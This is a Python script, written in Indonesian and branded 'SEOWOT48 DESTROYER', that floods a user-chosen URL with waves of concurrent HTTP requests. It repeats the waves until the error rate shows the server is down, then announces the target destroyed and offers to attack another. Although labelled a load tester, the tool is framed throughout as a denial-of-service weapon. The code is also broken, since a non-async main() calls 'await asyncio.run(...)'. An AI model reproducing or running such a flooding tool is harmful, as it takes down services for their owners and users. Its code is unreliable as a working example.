import asyncio
import aiohttp
import time
import statistics
from dataclasses import dataclass
from typing import List
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich import box
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.live import Live

console = Console()

@dataclass
class HasilTes:
    kode_status: int
    waktu_respon: float
    error: str = None

class TesterBebanKontinyu:
    def __init__(self):
        self.hasil_gelombang = []
        self.total_serangan = 0
        self.server_down = False
        self.waktu_mulai_keseluruhan = None
        self.console = Console()
        
    def tampilkan_banner(self):
        banner = """
 ███████ ███████  ██████  ██     ██  ██████  ████████ ██   ██  █████  
 ██      ██      ██    ██ ██     ██ ██    ██    ██    ██   ██ ██   ██ 
 ███████ █████   ██    ██ ██  █  ██ ██    ██    ██    ███████  █████  
      ██ ██      ██    ██ ██ ███ ██ ██    ██    ██         ██ ██   ██ 
 ███████ ███████  ██████   ███ ███   ██████     ██         ██  █████  
                                                                      
      ⚡ PENGHANCUR SERVER TANPA HENTI ⚡                           
        """
        
        self.console.print(Panel(
            Align.center(Text(banner, style="bold cyan")),
            title="🇮🇩 SEOWOT48 DESTROYER MODE 🇮🇩",
            border_style="bright_red",
            box=box.DOUBLE
        ))
    
    def input_konfigurasi(self):
        self.console.print("\n🎯 [bold green]Konfigurasi Serangan Tanpa Henti:[/bold green]\n")
        
        # Input URL
        url = Prompt.ask("🌐 [bold blue]URL target yang akan dihancurkan[/bold blue]", 
                        default="https://httpbin.org/get")
        
        # Input gelombang serangan
        request_per_gelombang = IntPrompt.ask("💥 [bold yellow]Request per gelombang serangan?[/bold yellow]", 
                                            default=500, show_default=True)
        
        # Input concurrent users
        pengguna_bersamaan = IntPrompt.ask("👥 [bold cyan]Pengguna bersamaan per gelombang?[/bold cyan]", 
                                         default=100, show_default=True)
        
        # Input interval antar gelombang
        interval_gelombang = IntPrompt.ask("⏰ [bold magenta]Interval antar gelombang (detik)?[/bold magenta]", 
                                         default=5, show_default=True)
        
        # Input batas error untuk mendeteksi server down
        batas_error = IntPrompt.ask("🚨 [bold red]Batas error rate untuk deteksi server down (%)?[/bold red]", 
                                  default=80, show_default=True)
        
        # Input method HTTP
        self.console.print("\n🔨 [bold magenta]Pilih metode HTTP:[/bold magenta]")
        self.console.print("1. GET (default)")
        self.console.print("2. POST")
        self.console.print("3. PUT")
        self.console.print("4. DELETE")
        
        pilihan_method = Prompt.ask("Pilih nomor", choices=["1", "2", "3", "4"], default="1")
        methods = {"1": "GET", "2": "POST", "3": "PUT", "4": "DELETE"}
        method = methods[pilihan_method]
        
        # Input data untuk POST/PUT
        data = None
        if method in ["POST", "PUT"]:
            ada_data = Confirm.ask(f"📤 Kirim data JSON untuk {method}?", default=False)
            if ada_data:
                data_json = Prompt.ask("Masukkan data JSON", default='{"test": "data"}')
                try:
                    import json
                    data = json.loads(data_json)
                except:
                    self.console.print("⚠️ JSON tidak valid, menggunakan data default")
                    data = {"test": "data"}
        
        return url, request_per_gelombang, pengguna_bersamaan, interval_gelombang, batas_error, method, data
    
    async def kirim_request(self, session: aiohttp.ClientSession, url: str, method: str = 'GET', data: dict = None) -> HasilTes:
        waktu_mulai = time.time()
        try:
            async with session.request(method, url, json=data, ssl=False) as response:
                await response.text()
                waktu_respon = time.time() - waktu_mulai
                return HasilTes(response.status, waktu_respon)
        except Exception as e:
            waktu_respon = time.time() - waktu_mulai
            return HasilTes(0, waktu_respon, str(e))

    def cek_server_down(self, hasil_gelombang: List[HasilTes], batas_error: int) -> bool:
        if not hasil_gelombang:
            return False
            
        hasil_error = [r for r in hasil_gelombang if r.kode_status != 200]
        error_rate = (len(hasil_error) / len(hasil_gelombang)) * 100
        
        return error_rate >= batas_error

    def buat_tabel_status_live(self, gelombang_ke: int, hasil_gelombang: List[HasilTes], waktu_total: float):
        tabel = Table(title=f"🔥 GELOMBANG SERANGAN KE-{gelombang_ke}", box=box.ROUNDED, border_style="bright_yellow")
        tabel.add_column("Status", style="bold white", justify="left")
        tabel.add_column("Nilai", style="bright_green", justify="right")
        
        hasil_sukses = [r for r in hasil_gelombang if r.kode_status == 200]
        hasil_error = [r for r in hasil_gelombang if r.kode_status != 200]
        error_rate = (len(hasil_error) / len(hasil_gelombang)) * 100 if hasil_gelombang else 0
        
        tabel.add_row("⏰ Waktu Serangan", f"{waktu_total:.1f} detik")
        tabel.add_row("🚀 Total Gelombang", f"{gelombang_ke}")
        tabel.add_row("💥 Request Gelombang Ini", f"{len(hasil_gelombang):,}")
        tabel.add_row("✅ Berhasil", f"{len(hasil_sukses):,}")
        tabel.add_row("❌ Gagal", f"{len(hasil_error):,}")
        tabel.add_row("📊 Error Rate", f"{error_rate:.1f}%")
        
        if hasil_sukses:
            waktu_respon = [r.waktu_respon for r in hasil_sukses]
            tabel.add_row("⚡ Avg Response", f"{statistics.mean(waktu_respon)*1000:.0f}ms")
        
        return tabel

    async def gelombang_serangan(self, url: str, request_per_gelombang: int, pengguna_bersamaan: int, method: str, data: dict) -> List[HasilTes]:
        connector = aiohttp.TCPConnector(limit=pengguna_bersamaan * 2, limit_per_host=pengguna_bersamaan)
        timeout = aiohttp.ClientTimeout(total=30)
        
        hasil_gelombang = []
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            semaphore = asyncio.Semaphore(pengguna_bersamaan)
            
            async def request_terbatas():
                async with semaphore:
                    hasil = await self.kirim_request(session, url, method, data)
                    hasil_gelombang.append(hasil)
                    return hasil
            
            tasks = [request_terbatas() for _ in range(request_per_gelombang)]
            await asyncio.gather(*tasks)
        
        return hasil_gelombang

    async def jalankan_serangan_kontinyu(self, url: str, request_per_gelombang: int, pengguna_bersamaan: int, 
                                       interval_gelombang: int, batas_error: int, method: str = 'GET', data: dict = None):
        self.console.print("\n🔥 [bold red]MODE DESTROYER AKTIF![/bold red]")
        self.console.print("⚠️ [bold yellow]Server akan diserang terus menerus sampai DOWN![/bold yellow]")
        self.console.print("💡 [bold blue]Tekan Ctrl+C untuk menghentikan serangan[/bold blue]\n")
        
        self.waktu_mulai_keseluruhan = time.time()
        gelombang_ke = 0
        
        try:
            while not self.server_down:
                gelombang_ke += 1
                
                self.console.print(f"\n💥 [bold red]GELOMBANG {gelombang_ke} - MENYERANG![/bold red]")
                
                # Progress bar untuk gelombang saat ini
                with Progress(
                    TextColumn("[bold blue]🔥 Menghancurkan server..."),
                    BarColumn(bar_width=50, style="bright_red", complete_style="bright_green"),
                    TextColumn("[bold green]{task.percentage:>3.0f}%"),
                    console=self.console
                ) as progress:
                    task = progress.add_task("serangan", total=100)
                    
                    # Jalankan gelombang serangan
                    hasil_gelombang = await self.gelombang_serangan(url, request_per_gelombang, pengguna_bersamaan, method, data)
                    progress.update(task, completed=100)
                
                self.hasil_gelombang.extend(hasil_gelombang)
                self.total_serangan += len(hasil_gelombang)
                
                # Cek apakah server down
                if self.cek_server_down(hasil_gelombang, batas_error):
                    self.server_down = True
                    self.console.print("\n🎯 [bold green]TARGET BERHASIL DIHANCURKAN![/bold green]")
                    break
                
                # Tampilkan status gelombang
                waktu_total = time.time() - self.waktu_mulai_keseluruhan
                tabel_status = self.buat_tabel_status_live(gelombang_ke, hasil_gelombang, waktu_total)
                self.console.print(tabel_status)
                
                # Jeda antar gelombang
                if not self.server_down:
                    self.console.print(f"\n⏳ [bold yellow]Menunggu {interval_gelombang} detik sebelum gelombang berikutnya...[/bold yellow]")
                    await asyncio.sleep(interval_gelombang)
                    
        except KeyboardInterrupt:
            self.console.print("\n🛑 [bold red]Serangan dihentikan oleh pengguna![/bold red]")
        
        self.tampilkan_laporan_final(gelombang_ke)

    def tampilkan_laporan_final(self, total_gelombang: int):
        waktu_total = time.time() - self.waktu_mulai_keseluruhan
        
        self.console.print("\n")
        self.console.print("="*80)
        
        # Banner hasil
        if self.server_down:
            hasil_banner = """
💀 ███████ ███████ ██████  ██    ██ ███████ ██████      ██████   ██████  ██     ██ ███    ██ 💀
💀 ██      ██      ██   ██ ██    ██ ██      ██   ██     ██   ██ ██    ██ ██     ██ ████   ██ 💀
💀 ███████ █████   ██████  ██    ██ █████   ██████      ██   ██ ██    ██ ██  █  ██ ██ ██  ██ 💀
💀      ██ ██      ██   ██  ██  ██  ██      ██   ██     ██   ██ ██    ██ ██ ███ ██ ██  ██ ██ 💀
💀 ███████ ███████ ██   ██   ████   ███████ ██   ██     ██████   ██████   ███ ███  ██   ████ 💀
            """
            style = "bold red on black"
            title = "🎯 MISI ACCOMPLISHED - SERVER DESTROYED!"
        else:
            hasil_banner = "⚔️ SERANGAN DIHENTIKAN - SERVER MASIH BERTAHAN ⚔️"
            style = "bold yellow"
            title = "⚠️ MISI INCOMPLETE"
        
        self.console.print(Panel(
            Align.center(Text(hasil_banner, style=style)),
            title=title,
            border_style="bright_cyan",
            box=box.DOUBLE
        ))
        
        # Tabel statistik final
        tabel_final = Table(title="📊 STATISTIK SERANGAN SEOWOT48", box=box.DOUBLE_EDGE, border_style="bright_magenta")
        tabel_final.add_column("Metrik", style="bold white", justify="left")
        tabel_final.add_column("Nilai", style="bright_green", justify="right")
        tabel_final.add_column("Status", style="bold yellow", justify="center")
        
        hasil_sukses = [r for r in self.hasil_gelombang if r.kode_status == 200]
        hasil_error = [r for r in self.hasil_gelombang if r.kode_status != 200]
        error_rate = (len(hasil_error) / len(self.hasil_gelombang)) * 100 if self.hasil_gelombang else 0
        rps = len(self.hasil_gelombang) / waktu_total if waktu_total > 0 else 0
        
        tabel_final.add_row("⏰ Total Waktu Serangan", f"{waktu_total:.1f} detik", "🕐")
        tabel_final.add_row("💥 Total Gelombang", f"{total_gelombang}", "⚔️")
        tabel_final.add_row("🚀 Total Request", f"{len(self.hasil_gelombang):,}", "📊")
        tabel_final.add_row("✅ Request Berhasil", f"{len(hasil_sukses):,}", "💚")
        tabel_final.add_row("❌ Request Gagal", f"{len(hasil_error):,}", "💔")
        tabel_final.add_row("📈 Error Rate", f"{error_rate:.1f}%", "🔥" if error_rate > 50 else "⚠️")
        tabel_final.add_row("⚡ Request/Detik", f"{rps:.2f}", "💨")
        
        if hasil_sukses:
            waktu_respon = [r.waktu_respon for r in hasil_sukses]
            tabel_final.add_row("📊 Avg Response Time", f"{statistics.mean(waktu_respon)*1000:.0f}ms", "⏱️")
        
        self.console.print(tabel_final)
        
        # Vonis final
        if self.server_down:
            vonis = "🏆 SEOWOT48 MENANG! TARGET BERHASIL DIHANCURKAN! 🏆"
            vonis_style = "bold green on black"
        elif error_rate > 70:
            vonis = "⚔️ SERVER HAMPIR MATI! Sedikit lagi akan DOWN! ⚔️"
            vonis_style = "bold yellow"
        else:
            vonis = "🛡️ SERVER MASIH KUAT! Perlu serangan lebih besar! 🛡️"
            vonis_style = "bold red"
        
        self.console.print("\n")
        self.console.print(Panel(
            Align.center(Text(vonis, style=vonis_style)),
            title="🎯 VONIS FINAL SEOWOT48",
            border_style="bright_cyan",
            box=box.DOUBLE
        ))

def main():
    tester = TesterBebanKontinyu()
    
    while True:
        try:
            tester.tampilkan_banner()
            
            url, request_per_gelombang, pengguna_bersamaan, interval_gelombang, batas_error, method, data = tester.input_konfigurasi()
            
            # Reset state untuk run baru
            tester.hasil_gelombang = []
            tester.total_serangan = 0
            tester.server_down = False
            
            await asyncio.run(tester.jalankan_serangan_kontinyu(url, request_per_gelombang, pengguna_bersamaan, 
                                                              interval_gelombang, batas_error, method, data))
            
            console.print("\n")
            ulang = Confirm.ask("🔄 [bold blue]Serang target lain?[/bold blue]", default=True)
            if not ulang:
                console.print("👋 [bold green]Terima kasih telah menggunakan SEOWOT48 DESTROYER![/bold green]")
                break
            else:
                console.clear()
                
        except KeyboardInterrupt:
            console.print("\n❌ [bold red]Program dibatalkan![/bold red]")
            break
        except Exception as e:
            console.print(f"\n💥 [bold red]Terjadi error: {e}[/bold red]")
            ulang = Confirm.ask("🔄 Coba lagi?", default=True)
            if not ulang:
                break

if __name__ == "__main__":
    main()